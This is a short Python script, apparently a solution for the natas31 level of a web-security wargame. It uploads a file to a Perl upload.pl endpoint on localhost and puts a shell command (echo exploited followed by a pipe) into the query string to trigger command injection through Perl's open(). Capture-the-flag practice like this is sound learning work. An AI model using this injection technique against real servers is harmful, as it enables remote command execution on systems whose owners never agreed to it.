import requests
session = requests.Session()

def natas31(url):
    with open('abc.txt', 'wb') as _file:
        _file.write(b"just test") 
    
    _files = [('upload_file', open('abc.txt', 'rb'))]
    response = session.post(url, files=_files, data={"submit": "Upload"})
    print(response.text)

if __name__ == '__main__':
    url = 'http://localhost:8080/upload.pl?echo%20exploited|'
    natas31(url)
